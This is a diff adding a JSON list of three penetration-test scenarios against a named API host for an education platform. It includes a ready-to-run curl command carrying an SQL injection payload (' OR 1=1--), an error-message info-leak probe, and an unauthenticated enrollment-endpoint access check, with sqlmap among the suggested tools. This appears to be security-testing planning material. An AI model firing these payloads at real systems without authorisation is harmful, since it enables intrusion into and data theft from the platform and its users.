@@ -1,0 +1,26 @@
+ [
+  {
+    "attack_vector": "Injection",
+    "test_scenario": "Test SQL injection vulnerability in course queries",
+    "template_payload": "https://api-edunex.cognisia.id/course/courses?include=lecturer,lecturer.user,contents&filter[name][ilike]=%<param>%",
+    "full_payload": "https://api-edunex.cognisia.id/course/courses?include=lecturer,lecturer.user,contents&filter[name][ilike]=%' OR 1=1--%",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/courses?include=lecturer,lecturer.user,contents&filter[name][ilike]=%'\' OR 1=1--\%'",
+    "recommended_tools": ["sqlmap"]
+  },
+  {
+    "attack_vector": "Info-leak",
+    "test_scenario": "Test for potential information leakage through error messages",
+    "template_payload": "/course/courses?error=1",
+    "full_payload": "/course/courses?error=1",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/courses?error=1'",
+    "recommended_tools": ["trufflehog"]
+  },
+  {
+    "attack_vector": "Authorization",
+    "test_scenario": "Test for lack of proper access control in courses endpoints",
+    "template_payload": "/course/enrolls/courses/123456789",
+    "full_payload": "/course/enrolls/courses/123456789",
+    "full_payload_with_curl": "curl -X GET 'https://api-edunex.cognisia.id/course/enrolls/courses/123456789'",
+    "recommended_tools": ["jwt-tool/autorize"]
+  }
+]
